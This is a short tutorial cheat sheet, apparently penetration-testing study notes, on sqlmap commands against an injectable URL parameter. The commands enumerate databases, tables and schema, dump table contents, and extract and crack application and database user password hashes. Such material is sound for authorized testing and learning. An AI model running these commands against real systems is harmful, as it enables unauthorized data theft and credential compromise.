# Enumeration

### Basic DB Enumeration
- We can use multiple flags to retrieve the information about the target's DB.

```bash
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```

--banner: Database version
--current-user: current username
--current-db: current database name
--is-dba: check if the current user has admin rights.


**Note**: A lot of time, we encounter user 'root' from enumeration. This 'root' user is completely different from the OS user 'root'.

### Tables Enumeration

```bash
sqlmap -u "https://example.com/?id=1" --tables -D $DB_NAME
```
--tables: dump all the table in the DB

### Users Enumeration

```bash
sqlmap -u "https://example.com/?id=1" --dump -T $TABLE_NAME -D $DB_NAME
```

--dump: retrieve all contents of the specified table
-T: specify the table name

### Table/Rows Enumeration

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
```

-C: specify the column name(s)

- To narrow down the output, use `--start` and `--stop`

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname --start=2 --stop=3
```

--start=2: start at the second entry
--stop=3: stop at the third entry

### Coditional Enumeration

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```

### Full DB Enumeration
- Use `--dump` to retrieve all the table in the database.
- Use `--dump-all` to retrieve all the content of all databases.


### DB Schema Enumeration

```bash
sqlmap -u "https://example.com/?id=1" --schema
```

### Searching for Data

```bash
sqlmap -u "https://example.com/?id=1" --search -T user
```

--search: perform search operations for any databases, rows or columns.

### Password Enumeration & Cracking
- Once we have identified the table containing passwords, we can run a regular sqlmap command and it will automatically crack the hashes

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
```

### DB Users Password Enumeration & Cracking
- Beside the applications' users, we are also interested in the DB users. Hence, we need to enumerate them and crack their passwords.

```bash
sqlmap -u "https://example.com/?id=1" --passwords --batch
```

--passwords: dump the content of system tables containing Database-specific credentials.
--batch: ignore all the prompts that require users' inpu while sqlmap is running.



